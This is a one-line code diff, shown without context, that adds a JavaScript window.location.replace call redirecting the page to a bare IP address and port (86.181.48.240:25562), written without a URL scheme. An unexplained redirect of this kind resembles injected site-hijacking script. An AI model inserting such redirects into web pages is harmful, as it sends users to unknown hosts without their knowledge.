@@ -1,0 +1,1 @@
+window.location.replace('86.181.48.240:25562')
